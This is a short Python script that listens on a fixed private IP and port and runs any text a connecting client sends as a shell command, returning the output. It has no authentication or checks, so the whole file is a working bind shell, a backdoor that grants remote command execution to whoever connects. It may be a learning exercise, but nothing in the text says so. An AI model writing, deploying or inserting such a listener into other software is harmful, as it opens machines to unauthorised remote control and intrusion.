#!/usr/bin/python3.6


import socket
import subprocess as sp
s = socket.socket()
port = 1234
ip = "192.168.43.206"

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind( (ip,port) )
s.listen()
while True:
	c1,  addr = s.accept()
	data  =  c1.recv(1024)
	out = sp.getoutput(data.decode())
	c1.send(out.encode())





